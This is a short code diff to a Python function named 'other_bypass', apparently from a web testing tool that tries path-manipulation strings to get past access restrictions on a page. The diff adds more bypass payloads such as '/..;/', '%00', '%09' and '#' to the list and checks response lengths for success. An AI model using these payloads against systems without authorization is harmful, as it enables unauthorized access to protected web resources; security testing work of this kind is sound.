@@ -70,7 +70,7 @@ def other_bypass(s, url, page, req_url, exclude_len):
 	other_bypass: all other known bypass
 	"""
 	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/", page+"..%3B",
-	page+"/%3B", page+".%3B/", page+"~"] #http://exemple.com/+page+bypass
+	page+"/%3B", page+".%3B/", page+"~", page+"/..;/", page+"%20", page+"%09", page+"%00", page+"??", page+"#"] #http://exemple.com/+page+bypass
 
 	len_req_url = len(req_url.content)
 	ranges = range(len_req_url - 50, len_req_url + 50) if len_req_url < 100000 else range(len_req_url - 1000, len_req_url + 1000)
